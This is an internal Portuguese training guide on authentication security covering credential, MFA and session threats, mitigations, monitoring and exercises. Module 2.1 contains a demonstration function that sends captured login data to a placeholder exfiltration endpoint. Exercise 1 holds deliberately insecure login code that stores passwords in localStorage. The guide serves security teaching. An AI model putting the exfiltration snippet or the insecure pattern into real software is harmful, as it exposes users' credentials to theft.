# Guia de Formação em Segurança de Autenticação

## Introdução

Este guia de formação foi desenvolvido para acompanhar as demonstrações de vulnerabilidades de segurança implementadas no sistema MEIV World. O objetivo é proporcionar uma compreensão profunda das vulnerabilidades comuns em sistemas de autenticação, como estas podem ser exploradas por atacantes, e as melhores práticas para mitigar estes riscos.

## Objetivos de Aprendizagem

Após completar esta formação, os participantes serão capazes de:

1. Identificar vulnerabilidades comuns em sistemas de autenticação
2. Compreender como credenciais e tokens MFA podem ser interceptados
3. Implementar medidas de segurança eficazes para proteger processos de login
4. Realizar revisões de código com foco em segurança
5. Responder a incidentes de segurança relacionados com autenticação

## Módulo 1: Fundamentos de Segurança em Autenticação

### 1.1 Modelo de Ameaças em Processos de Login

Os processos de login são alvos primários para atacantes devido ao valor das credenciais de autenticação. As principais ameaças incluem:

- **Phishing**: Enganar utilizadores para revelar credenciais em sites falsos
- **Credential Stuffing**: Utilizar credenciais vazadas de outros serviços
- **Brute Force**: Tentativas sistemáticas de adivinhar credenciais
- **Man-in-the-Middle**: Interceptar comunicações entre utilizador e servidor
- **Session Hijacking**: Roubar tokens de sessão após autenticação
- **Keylogging**: Capturar entradas de teclado para obter credenciais

### 1.2 Conceitos Fundamentais de Segurança

- **Defesa em Profundidade**: Múltiplas camadas de controles de segurança
- **Princípio do Menor Privilégio**: Conceder apenas os acessos mínimos necessários
- **Falha Segura**: Sistemas devem falhar de forma que não comprometa a segurança
- **Segregação de Dados**: Separar dados sensíveis de autenticação de outros dados
- **Monitorização Contínua**: Detecção e resposta em tempo real a atividades suspeitas

## Módulo 2: Vulnerabilidades de Intercepção de Credenciais

### 2.1 Como Credenciais São Expostas

Neste módulo, analisamos o código de demonstração que simula como credenciais podem ser interceptadas:

```javascript
// DEMONSTRAÇÃO - NÃO IMPLEMENTAR EM PRODUÇÃO
export const interceptAuthData = (authData) => {
  // Log intercepted data locally (demonstration purposes only)
  console.warn('SECURITY DEMONSTRATION: Intercepted authentication data:', authData);
  
  // In a real attack, data could be sent to an external endpoint
  fetch(EXFILTRATION_ENDPOINT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      source: 'meiv-login',
      timestamp: new Date().toISOString(),
      data: authData
    })
  });

  return authData;
};
```

### 2.2 Vetores de Ataque Comuns

- **Cross-Site Scripting (XSS)**: Injeção de código malicioso que captura dados de formulários
- **Formulários não-HTTPS**: Envio de credenciais em texto claro pela rede
- **Event Listeners Maliciosos**: Código JavaScript que monitora eventos de entrada
- **Extensões de Navegador Comprometidas**: Acesso direto ao DOM e dados de formulários
- **Malware no Dispositivo Cliente**: Keyloggers e screen scrapers

### 2.3 Mitigações Eficazes

- Implementar HTTPS com HSTS
- Utilizar Content Security Policy (CSP) para prevenir XSS
- Sanitizar todas as entradas de utilizador
- Implementar autenticação baseada em tokens com OAuth 2.0 e OpenID Connect
- Evitar armazenamento de credenciais no lado cliente

## Módulo 3: Vulnerabilidades de MFA

### 3.1 Ataques ao Processo de MFA

O código de demonstração mostra como tokens MFA podem ser interceptados:

```javascript
// DEMONSTRAÇÃO - NÃO IMPLEMENTAR EM PRODUÇÃO
export const interceptMFAToken = (token, userId) => {
  console.warn('SECURITY DEMONSTRATION: Intercepted MFA token:', { token, userId });
  
  // In a real attack, this token could be quickly used before it expires
  return token;
};
```

### 3.2 Limitações de Diferentes Métodos de MFA

- **SMS**: Vulnerável a SIM swapping e intercepção de rede
- **Email**: Vulnerável se a conta de email for comprometida
- **TOTP (Google Authenticator)**: Vulnerável a phishing em tempo real
- **Push Notifications**: Vulnerável a "prompt bombing" (múltiplas notificações)

### 3.3 Implementação Segura de MFA

- Utilizar WebAuthn/FIDO2 sempre que possível (resistente a phishing)
- Implementar limitação de tentativas e atrasos incrementais
- Verificar o contexto do dispositivo entre os passos de autenticação
- Oferecer opções de backup seguras para recuperação de acesso

## Módulo 4: Vulnerabilidades de Sessão

### 4.1 Como Sessões São Comprometidas

O código de demonstração ilustra um ataque de sequestro de sessão:

```javascript
// DEMONSTRAÇÃO - NÃO IMPLEMENTAR EM PRODUÇÃO
export const interceptSessionToken = (sessionToken) => {
  console.warn('SECURITY DEMONSTRATION: Intercepted session token:', sessionToken);
  
  // In a real attack, this session token could be used to hijack user sessions
  return sessionToken;
};
```

### 4.2 Problemas Comuns de Gestão de Sessão

- Tokens de sessão com vida útil muito longa
- Armazenamento inseguro de tokens (localStorage vs. cookies)
- Falta de renovação de sessão após eventos importantes
- Ausência de vinculação de sessão ao dispositivo/IP

### 4.3 Melhores Práticas para Segurança de Sessão

- Utilizar cookies HttpOnly, Secure e SameSite=Strict
- Implementar tempos de expiração curtos com renovação automática
- Registar metadata de sessão (IP, User-Agent, geolocalização)
- Permitir aos utilizadores ver e terminar sessões ativas
- Implementar rotação de tokens após eventos críticos (alteração de senha, etc.)

## Módulo 5: Monitorização e Resposta a Incidentes

### 5.1 Detecção de Atividades Suspeitas

```javascript
// Exemplo de monitorização de segurança
detectBruteForce(userId) {
  const attempts = this.authAttempts.get(userId);
  const recentAttempts = attempts.filter(a => 
    Date.now() - a.timestamp < 15 * 60 * 1000 // Last 15 minutes
  );
  
  const failedAttempts = recentAttempts.filter(a => !a.success);
  
  if (failedAttempts.length >= 5) {
    this.triggerAlert({
      type: 'BRUTE_FORCE',
      userId,
      failedAttempts: failedAttempts.length,
      timeWindow: '15 minutes',
      severity: 'HIGH'
    });
  }
}
```

### 5.2 Estratégias de Logging Seguro

- Logging centralizado com timestamps precisos
- Normalização e indexação de logs para análise rápida
- Proteção de logs contra manipulação
- Retenção adequada para investigação forense
- Exclusão de dados sensíveis dos logs (PII, tokens, passwords)

### 5.3 Plano de Resposta a Incidentes

1. **Detecção**: Identificar rapidamente comprometimentos de autenticação
2. **Contenção**: Bloquear acesso não autorizado e isolar sistemas afetados
3. **Erradicação**: Remover acesso do atacante e vulnerabilidades exploradas
4. **Recuperação**: Restaurar serviços e credenciais de forma segura
5. **Análise**: Documentar o incidente e extrair lições aprendidas

## Exercícios Práticos

### Exercício 1: Análise de Código

Revise o seguinte código e identifique as vulnerabilidades:

```javascript
function login() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  
  // Save for "Remember Me" functionality
  if (document.getElementById('remember').checked) {
    localStorage.setItem('savedUsername', username);
    localStorage.setItem('savedPassword', password);
  }
  
  fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username, password }),
    headers: { 'Content-Type': 'application/json' }
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      localStorage.setItem('authToken', data.token);
      window.location.href = '/dashboard';
    }
  });
}
```

### Exercício 2: Implementação Segura

Reescreva o código do Exercício 1 utilizando práticas seguras de autenticação.

### Exercício 3: Resposta a Incidentes

Você recebe um alerta indicando múltiplas tentativas de autenticação com o mesmo utilizador a partir de diferentes países em um curto período de tempo. Algumas dessas tentativas foram bem-sucedidas. Descreva seu plano de resposta a este incidente.

## Recursos Adicionais

1. [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
2. [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
3. [Auth0 MFA Implementation Guide](https://auth0.com/docs/secure/multi-factor-authentication)
4. [Google Web Security Documentation](https://developers.google.com/web/fundamentals/security)

## Certificação

Ao concluir esta formação e passar na avaliação prática, os participantes receberão uma certificação em "Segurança Avançada de Autenticação" válida por 12 meses.

---

*Este material é destinado apenas para fins de formação interna. As demonstrações de vulnerabilidades não devem ser implementadas em ambientes de produção.*
